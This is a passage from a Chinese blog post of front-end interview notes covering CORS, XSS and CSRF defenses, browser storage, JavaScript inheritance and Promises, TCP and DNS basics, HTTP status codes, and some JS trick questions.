class="string">"DNT,X-CustomHeader,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type"</span>);  </span><br><span class="line">    res.header(<span class="string">"Access-Control-Allow-Methods"</span>,<span class="string">"<span class="keyword">PUT</span>,<span class="keyword">POST</span>,<span class="keyword">GET</span>,<span class="keyword">DELETE</span>,<span class="keyword">OPTIONS</span>"</span>);  </span><br><span class="line">    next();  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>有些还会跟你死磕,,除了这些还有其他姿势么…我说了一个HTML5的postMessage….</p><p>这货用于iframe 传递消息居多, 大体有这么两步步</p><ul><li>window打开一个实例,传递一个消息到一个x域名</li><li>x 域名下监听message事件,获取传递的消息</li></ul><p>这货的兼容性没那么好,而且没考虑周全的下容易遭受 CSRF 攻击</p><h2 id="对于XSS-和-CSRF-如何防范"><a href="#对于XSS-和-CSRF-如何防范" class="headerlink" title="对于XSS 和 CSRF 如何防范"></a>对于XSS 和 CSRF 如何防范</h2><p>这里就不说概念性的东西了</p><p><strong>XSS的防范</strong></p><ul><li>我能想到的就是转义&lt;&gt;这些造成代码直接运行的的标签..轮询或者正则替换<br>  而面试官说这种的效率最低下,我回来仔细找了找相关资料好像没有更优方案…有的留言…</li></ul><ul><li>若是有用到 cookie,设置为http-only,避免客户端的篡改</li></ul><p><strong>CSRF的防范一般这几种</strong></p><ul><li>验证码,用户体验虽然不好,,但是很多场合下可以防范大多数攻击</li><li>验证 HTTP Referer 字段,判断请求来源</li><li>token加密解密,这种是目前很常用的手段了…</li></ul><p>任何防范都有代价的,比如验证码造成的体验不好,token滥用造成的性能问题,轮询替换造成的响应时间等</p><h2 id="描述下cookie-sessionStorage-localSotrage的差异"><a href="#描述下cookie-sessionStorage-localSotrage的差异" class="headerlink" title="描述下cookie,sessionStorage,localSotrage的差异"></a>描述下cookie,sessionStorage,localSotrage的差异</h2><ul><li>cookie : 大小4KB 左右,跟随请求(请求头),会占用带宽资源,但是若是用来判断用户是否在线这些挺方便</li><li>sessionStorage和localStorage大同小异,大小看浏览器支持,一般为5MB,数据只保留在本地,不参与服务端交互.<ul><li>sessionStorage的生存周期只限于会话中,关闭了储存的数据就没了.</li><li>localStorage则保留在本地,没有人为清除会一直保留</li></ul></li></ul><h2 id="javascript里面的继承怎么实现，如何避免原型链上面的对象共享"><a href="#javascript里面的继承怎么实现，如何避免原型链上面的对象共享" class="headerlink" title="javascript里面的继承怎么实现，如何避免原型链上面的对象共享"></a>javascript里面的继承怎么实现，如何避免原型链上面的对象共享</h2><p>我在写的时候,用了两种,一个是 ES5和 ES6的方案</p><p>ES5:寄生组合式继承:通过借用构造函数来继承属性和原型链来实现子继承父。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ParentClass</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    ParentClass.prototype.sayHello = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"I'm parent!"</span> + <span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">SubClass</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">      <span class="comment">//若是要多个参数可以用apply 结合 ...解构</span></span><br><span class="line">      ParentClass.call(<span class="keyword">this</span>, name);</span><br><span class="line">      <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    SubClass.prototype = <span class="built_in">Object</span>.create(ParentClass.prototype);</span><br><span class="line">    SubClass.prototype.constructor = SubClass;</span><br><span class="line">    SubClass.prototype.sayChildHello = <span class="function"><span class="keyword">function</span> (<span class="params">name</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">"I'm child "</span> + <span class="keyword">this</span>.name)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> testA = <span class="keyword">new</span> SubClass(<span class="string">'CRPER'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Object.create()的polyfill</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    function pureObject(o)&#123;</span></span><br><span class="line"><span class="comment">        //定义了一个临时构造函数</span></span><br><span class="line"><span class="comment">         function F() &#123;&#125;</span></span><br><span class="line"><span class="comment">         //将这个临时构造函数的原型指向了传入进来的对象。</span></span><br><span class="line"><span class="comment">         F.prototype = obj;</span></span><br><span class="line"><span class="comment">         //返回这个构造函数的一个实例。该实例拥有obj的所有属性和方法。</span></span><br><span class="line"><span class="comment">         //因为该实例的原型是obj对象。</span></span><br><span class="line"><span class="comment">         return new F();</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br></pre></td></tr></table></figure><p>ES6: 其实就是ES5的语法糖,不过可读性很强..</p><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">      constructor(name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">      &#125;</span><br><span class="line">      sayHello() &#123;</span><br><span class="line">        console.log(<span class="string">"I'm parent!"</span> + <span class="keyword">this</span>.name);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">      constructor(name) &#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">      sayChildHello() &#123;</span><br><span class="line">        console.log(<span class="string">"I'm child "</span> + <span class="keyword">this</span>.name)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">// 重新声明父类同名方法会覆写,ES5的话就是直接操作自己的原型链上</span></span><br><span class="line">      sayHello()&#123;</span><br><span class="line">        console.log(<span class="string">"override parent method !,I'm sayHello Method"</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    let testA = <span class="keyword">new</span> <span class="type">SubClass</span>(<span class="symbol">'CRPE</span>R')</span><br></pre></td></tr></table></figure><p>到这里就结束了么…不,这只是笔试,</p><p>问的时候你用过静态方法,静态属性,私有变量么?</p><p>这个静态方法是ES6之后才有这么个玩意,有这么些特点</p><ul><li>方法不能给 this引用,可以给类直接引用</li><li>静态不可以给实例调用,比如 let a = new ParentClass =&gt; a.sayHello() 会抛出异常</li><li>父类静态方法,子类非static方法没法覆盖父类</li><li>静态方法可以给子类继承</li><li>静态属性可以继承也可以被修改</li></ul><p>看下面的代码..</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">      <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">static</span> sayHello() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I'm parent!"</span> + <span class="keyword">this</span>.name);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">static</span> testFunc()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'emm...Parent test static Func'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">SubClass</span> <span class="keyword">extends</span> <span class="title">ParentClass</span> </span>&#123;</span><br><span class="line">      <span class="keyword">constructor</span>(name) &#123;</span><br><span class="line">        <span class="keyword">super</span>(name);</span><br><span class="line">      &#125;</span><br><span class="line">      sayChildHello() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"I'm child "</span> + <span class="keyword">this</span>.name)</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">static</span> sayHello() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"override parent method !,I'm sayHello Method"</span>)</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">static</span> testFunc2() &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">super</span>.testFunc() + <span class="string">'fsdafasdf'</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ParentClass.sayHello(); <span class="comment">// success print</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> a = <span class="keyword">new</span> ParentClass(<span class="string">'test'</span>);</span><br><span class="line">    a.sayHello() <span class="comment">// throw error</span></span><br><span class="line"></span><br><span class="line">    SubClass.sayHello(); <span class="comment">// 同名 static 可以继承且覆盖</span></span><br><span class="line">    </span><br><span class="line">    SubClass.testFunc2(); <span class="comment">// 可以继承</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> testA = <span class="keyword">new</span> SubClass(<span class="string">'CRPER'</span>);</span><br></pre></td></tr></table></figure><p>私有变量这个我没答出来,只是说了下没有private这个关键字和基本用下划线的人为区分</p><p>所以回来只是找了下相关的资料,发现有一个比较好的模拟方案,就是WeakMap;</p><p>WeakMap可以避免内存泄露,当没有被值引用的时候会自动给内存寄存器回收了.</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">const <span class="literal">_</span> = <span class="keyword">new</span> <span class="type">WeakMap</span>(); <span class="comment">// 实例化,value 必须为对象,有 delete,get,has,set四个方法,看名字都知道了</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestWeakMap</span> </span>&#123;</span><br><span class="line">  constructor(id, barcode) &#123;</span><br><span class="line">    <span class="literal">_</span>.<span class="keyword">set</span>(<span class="built_in">this</span>, &#123; id,barcode &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  testFunc() &#123;</span><br><span class="line">    let &#123; id,barcode &#125; = <span class="literal">_</span>.<span class="keyword">get</span>(<span class="built_in">this</span>); <span class="comment">// 获取对应的值</span></span><br><span class="line">    <span class="keyword">return</span> &#123; id,barcode &#125;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="谈谈你对-Promise-的理解-和-ajax-有关系么"><a href="#谈谈你对-Promise-的理解-和-ajax-有关系么" class="headerlink" title="谈谈你对 Promise 的理解? 和 ajax 有关系么?"></a>谈谈你对 Promise 的理解? 和 ajax 有关系么?</h2><p>Promise和ajax没有半毛钱直接关系. promise只是为了解决”回调地狱”而诞生的;</p><p>平时结合 ajax是为了更好的梳理和控制流程…这里我们简单梳理下..</p><p>Promise有三种状态,Pending/resolve()/reject();</p><p>一些需要注意的小点,如下</p><ul><li>在 Pending 转为另外两种之一的状态时候,状态不可在改变..</li><li>Promise的 then为异步.而(new Promise())构造函数内为同步</li><li>Promise的catch不能捕获任意情况的错误(比如 then 里面的setTimout内手动抛出一个Error)</li><li>Promise的 resolve若是传入值而非函数,会发生值穿透的现象</li></ul><p>Promise 还有一些自带的方法,比如race,all,前者有任一一个解析完毕就返回,后者所有解析完毕返回…</p><p><a href="https://juejin.im/post/5a04066351882517c416715d" target="_blank" rel="noopener">Promise 必知必会（十道题）</a><br><a href="http://liubin.org/promises-book/" target="_blank" rel="noopener">JavaScript Promise迷你书（中文版）</a></p><h2 id="谈谈你对-TCP-的理解"><a href="#谈谈你对-TCP-的理解" class="headerlink" title="谈谈你对 TCP 的理解"></a>谈谈你对 TCP 的理解</h2><pre><code>Q: TCP 是在哪个OSI 的哪个层!通讯过程是全双工还是半双工(单工)?A: 传输层,全双工Q: TCP的通讯的过程是怎么样的!A: 整个过程是三次握手,四次挥手..Q: 你说的没错,说说整个过程如何?A: 举个栗子,我把 TCP 比做两个人用对讲机沟通(大白话)..三次握手就是.A1(吼叫方,客户端)想要呼叫 A2(控制室的某某,服务端)..A1对着对讲机说&quot;over over ,听到请回答&quot;(第一次,请求应答) ...A2收到回应&quot;收到收到,你说&quot;(第二次,确认应答)A1开始巴拉巴拉个不停而 A2没拒绝(第三次,通讯建立)而四次挥手则是两者确认互相倾述完毕的过程..A1说:&quot;控制室,报告完毕了&quot;(第一次挥手)A2说:&quot;知道了...那么你废话说完就好好听我指挥....巴拉巴拉..&quot;(第二次挥手)A1此时等待控制室说完毕,而控制室等回应(第三次挥手)等到 A1回馈控制室确认都知道完毕了..(第四次挥手)...</code></pre><p>以上都是瞎掰,可能有些地方描述不当,笑笑就好了<br>TCP没有百分百建立成功的,会造成链接失败的情况有很多..<br>比如长时间没应答(A1吼了半天没有反应或者 A2应答了而 A1不再鸟它)..亦或者丢包(对讲机也没了);<br>TCP 协议相关的文章网上很多,若是要更加全面的了解该协议请自行引擎..<br>我建议阅读&lt;&lt;TCP-IP详解卷1~卷3&gt;&gt;,这个是网络圣经…很厚…我只看了一丢丢..</p><h2 id="TCP-你了解了-那么-OSI-七层协议和五层网络架构应该知道吧"><a href="#TCP-你了解了-那么-OSI-七层协议和五层网络架构应该知道吧" class="headerlink" title="TCP 你了解了,那么 OSI 七层协议和五层网络架构应该知道吧?"></a>TCP 你了解了,那么 OSI 七层协议和五层网络架构应该知道吧?</h2><p>对于这类的问题我也只能大体点了下,毕竟不是专攻网络这块的…<br>OSI 七层涵盖:物理层,数据链路层,网络层,传输层,会话层,表示层,应用层;<br>五层模型就是”会话,表示,应用层”同为一层;<br>Q: DNS 的大体的执行流程了解么,属于哪个层级?工作在哪个层级?<br>DNS 属于应用层协议, 至于TCP/UDP哪一层上面跑,看情况 , 大体的执行流程是这样的;</p><p>优先读取浏览器缓存<br>其次系统的缓存<br>都没有的情况下,找本地hosts文件(比如你写了映射关系优先寻找)<br>再没有的情况找最近的域名解析服务器<br>再没有则扩大访问,最终找到根服务器,还是没有就失败了..</p><p>DNS 的解析的几个记录类型需要了解:</p><p>A: 域名直接到 IP<br>CNAME: 可以多个域名映射到一个主机,类似在 Github Page就用 CNAME 指向<br>MX: 邮件交换记录,用的不多,一般搭建邮件服务器才会用到<br>NS: 解析服务记录,可以设置权重,指定谁解析<br>TTL: 就是生存时间(也叫缓存时间),一般的域名解析商都有默认值,也可以人为设置<br>TXT: 一般指某个主机名或域名的说明</p><p>回来我找下相关的资料,有兴趣的可以深入了解下,传送门如下:</p><p><a href="http://www.cnblogs.com/kevingrace/p/5909719.html" target="_blank" rel="noopener">梳理Linux下OSI七层网络与TCP/IP五层网络架构</a><br><a href="https://www.html5rocks.com/zh/tutorials/file/xhr2/" target="_blank" rel="noopener">TCP/IP（六）应用层（DNS和HTTP协议）</a><br><a href="https://zhuanlan.zhihu.com/p/28305778" target="_blank" rel="noopener">DNS域名解析解剖</a></p><h2 id="HTTP-和-HTTPS-有何差异-听说过-SPDY-么"><a href="#HTTP-和-HTTPS-有何差异-听说过-SPDY-么" class="headerlink" title="HTTP 和 HTTPS 有何差异? 听说过 SPDY 么?"></a>HTTP 和 HTTPS 有何差异? 听说过 SPDY 么?</h2><p>我只是粗浅的回答了下…<br>HTTP相对于 HTTPS来说,速度较快且开销较小(没有 SSL/TSL) 对接,默认是80端口;<br>HTTP容易遭受域名劫持,而HTTPS相对来说就较为安全但开销较大(数据以加密的形式传递),默认端口为443..<br>HTTP是明文跑在 TCP 上.而HTTPS跑在SSL/TLS应用层之下,TCP上的<br>Q: 那么 HTTPS中的TLS/SSL是如何保护数据的…<br>一般有两种形式,非对称加密,生成公钥和私钥,私钥丢服务器,公钥每次请求去比对验证;<br>更严谨的采用 CA(Certificate Authority),给密钥签名….<br>Q: SPDY 听说过么.什么来的?<br>谷歌推行一种协议(HTTP 之下SSL之上[TCP]),可以算是HTTP2的前身,有这么些优点</p><p>压缩数据(HEADER)<br>多路复用<br>优先级(可以给请求设置优先级)</p><p>而这些优点基本 HTTP2也继承下来了..<br>Q: 你对 HTTP 的状态吗了解多少…<br>这里列举一丢丢常见的..</p><p>1XX: 一般用来判断协议更换或者确认服务端收到请求这些</p><p>100: 服务端收到部分请求,若是没有拒绝的情况下可以继续传递后续内容<br>101: 客户端请求变换协议,服务端收到确认</p><p>2xx: 请求成功,是否创建链接,请求是否接受,是否有内容这些</p><p>200: 请求成功<br>201: 请求创建成功和资源创建成功</p><p>3XX: 一般用来判断重定向和缓存</p><p>301: 所有请求已经转移到新的 url(永久重定向),会被缓存<br>302: 临时重定向,不会被缓存<br>304: 本地资源暂未改动,优先使用本地的(根据If-Modified-Since or If-Match去比对服务器的资源,缓存)</p><p>4XX: 一般用来确认授权信息,请求是否出错,页面是否丢失</p><p>400: 请求出错<br>401: 未授权,不能读取某些资源<br>403: 阻止访问,一般也是权限问题<br>404: 页面丢失,资源没找到<br>408: 请求超时<br>415: 媒介类型不被支持，服务器不会接受请求。</p><p>5XX: 基本都是服务端的错误</p><p>500: 服务端错误<br>502: 网关错误<br>504: 网关超时</p><h2 id="几个短而让我印象深刻的题"><a href="#几个短而让我印象深刻的题" class="headerlink" title="几个短而让我印象深刻的题"></a>几个短而让我印象深刻的题</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(<span class="string">"a"</span> <span class="keyword">in</span> <span class="built_in">window</span>))&#123;</span><br><span class="line">    <span class="keyword">var</span> a = <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(a); <span class="comment">// undefined</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// !("a" i n window)  , 返回 true</span></span><br><span class="line"><span class="comment">// 留言小伙伴的刨析,非常感谢,还是涉及变量提升的问题</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> var a;</span></span><br><span class="line"><span class="comment">if(!("a" in window))&#123;</span></span><br><span class="line"><span class="comment">    a = 10;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 变种题</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> <span class="keyword">var</span>  x = c =  b = &#123;<span class="attr">a</span>:<span class="number">1</span>&#125;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(x.a); <span class="comment">// error , a is not defined</span></span><br><span class="line"><span class="built_in">console</span>.log(c,b) <span class="comment">// &#123;a: 1&#125; &#123;a: 1&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="keyword">count</span> = 0;</span><br><span class="line"></span><br><span class="line">console.<span class="built_in">log</span>(<span class="keyword">typeof</span> <span class="keyword">count</span> === <span class="string">"number"</span>); <span class="comment">// true , 这个不用解释了</span></span><br><span class="line"></span><br><span class="line">console.<span class="built_in">log</span>(!!<span class="keyword">typeof</span> <span class="keyword">count</span> === <span class="string">"number"</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里涉及到就是优先级和布尔值的问题</span></span><br><span class="line"><span class="comment">// typeof count 就是字符串"number"</span></span><br><span class="line"><span class="comment">// !!是转为布尔值(三目运算符的变种),非空字符串布尔值为 true</span></span><br><span class="line"><span class="comment">// 最后才=== 比较 , true === "number" , return false</span></span><br></pre></td></tr></table></figure><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = b = <span class="number">3</span>;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> a === <span class="string">"undefined"</span>); <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> b === <span class="string">"undefined"</span>); <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里涉及的就是立即执行和闭包的问题,还有变量提升,运算符执行方向(=号自左向右)</span></span><br><span class="line"><span class="comment">// 那个函数可以拆成这样</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  <span class="title">var</span> <span class="title">a</span></span>; <span class="comment">/* 局部变量,外部没法访问*/</span></span><br><span class="line">  b = <span class="number">3</span>; <span class="comment">/* 全局变量,so . window.b === 3 , 外部可以访问到*/</span></span><br><span class="line">  a = b;</span><br><span class="line">&#125;)()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若是改成这样,这道题应该是对的</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span> b === <span class="string">"number"</span> &amp;&amp; b ===<span class="number">3</span></span><br><span class="line">); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">something</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.a = something;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">  foo:foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj1.foo(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(obj1.a) <span class="comment">// 2 ,此时的 this 上下文还在 obj1内,若是 obj1.foo 先保存当做引用再执行传参,则上下文为 window</span></span><br><span class="line"></span><br><span class="line">obj1.foo.call(obj2,<span class="number">3</span>); <span class="comment">// 用 call 强行改变上下文为 obj2内</span></span><br><span class="line"><span class="built_in">console</span>.log(obj2.a); <span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span>  bar = <span class="keyword">new</span> obj1.foo(<span class="number">4</span>); <span class="comment">// 这里产生了一个实例</span></span><br><span class="line"><span class="built_in">console</span>.log(obj1.a); <span class="comment">// 2</span></span><br><span class="line"><span class="built_in">console</span>.log(bar.a); <span class="comment">// 4;  new的绑定比隐式和显式绑定优先级更高</span></span><br></pre></td></tr></table></figure><h2 id="还有一道题目是涉及事件循环-执行的优先权的"><a href="#还有一道题目是涉及事件循环-执行的优先权的" class="headerlink" title="还有一道题目是涉及事件循环,执行的优先权的.."></a>还有一道题目是涉及事件循环,执行的优先权的..</h2><p>就是 macrotask和microtask 相关的, 具体记不起来了..那时候给了答案虽然对了.</p><p>要说出所以然,给秀了一脸..回来找了下相关的资料;</p><p><a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html" target="_blank" rel="noopener">JavaScript 运行机制详解：再谈Event Loop</a><br><a href="https://juejin.im/post/5a2e21486fb9a0450407d370" target="_blank" rel="noopener">深入理解事件循环和异步流程控制</a><br><a href="https://juejin.im/post/5984816a518825265674c8f6" target="_blank" rel="noopener">所有你需要知道的关于完全理解 Node.js 事件循环及其度量</a></p><h2 id="你对基础算法这块掌握的如何…"><a href="#你对基础算法这块掌握的如何…" class="headerlink" title="你对基础算法这块掌握的如何…."></a>你对基础算法这块掌握的如何….</h2><pre><code>来,这纸给你,写个快排试试...</code></pre><p><a href="https://juejin.im/post/57dcd394a22b9d00610c5ec8" target="_blank" rel="noopener">十大经典排序算法总结（JavaScript描述）</a></p><h2 id="设计模式你了解多少"><a href="#设计模式你了解多少" class="headerlink" title="设计模式你了解多少?"></a>设计模式你了解多少?</h2><p><a href="http://www.cnblogs.com/tugenhua0707/p/5198407.html" target="_blank" rel="noopener">Javascript常用的设计模式详解</a><br><a href="https://github.com/ToNiQian/js-design-pattern" target="_blank" rel="noopener">js-design-pattern</a></p><h2 id="思维拓展题-你有两个玻璃球-有个100米的高楼-求玻璃球在哪个楼层扔下会碎-用的次数最少"><a href="#思维拓展题-你有两个玻璃球-有个100米的高楼-求玻璃球在哪个楼层扔下会碎-用的次数最少" class="headerlink" title="思维拓展题: 你有两个玻璃球,有个100米的高楼,求玻璃球在哪个楼层扔下会碎(用的次数最少);"></a>思维拓展题: 你有两个玻璃球,有个100米的高楼,求玻璃球在哪个楼层扔下会碎(用的次数最少);</h2><p>问题的要点: 玻璃球碎(有限个数) ,确定楼层数 , 最少次数 =&gt; 就是求最优的公式</p><p>在这道题上给秀的一脸,我的第一次的思路</p><pre><code>先折半,就变成[1-50][51-100], 那就是 1+50 = 51次 ...</code></pre><p>面试大佬说,你用了快排的思路就肯定不是最优的..</p><pre><code>憋了许久,想到开平方 \sqrt[2]{100} , 这样的话,最多只要20次</code></pre><p>然后又说给我三个球,在1000米的高楼,判断多少次…但是根据我上面的话,</p><pre><code>开立方, \sqrt[3]{1000} , 那最多不超过30次;</code></pre><p>至于第一次丢球的位置如何确定, 就是开平之后的值作为一个区间.</p><p>若 N 个球和 M 米的大厦…第一次丢球的高度区间就是这个了\frac{m}{\sqrt[n]{m}}</p><p>面试大佬说这个还可以…那就暂且告一段落</p><p>…回来用万能的搜索引擎找了下..最优方案+最少次数需要考虑的东西很多,没那么简单</p><p>传送门: <a href="https://www.zhihu.com/question/31855632" target="_blank" rel="noopener">知乎有人讨论了这个问题</a>;</p><p>但是高数还老师了..这种帖子看的一脸懵逼….抽空再好好研究下</p><h2 id="你对优化这块了解多少"><a href="#你对优化这块了解多少" class="headerlink" title="你对优化这块了解多少?"></a>你对优化这块了解多少?</h2><p>大体常见的手段了解.</p><p>比如从客户端着手的:</p><ul><li>压缩代码(JS/CSS),压缩图片</li><li>合并一些小图片(css 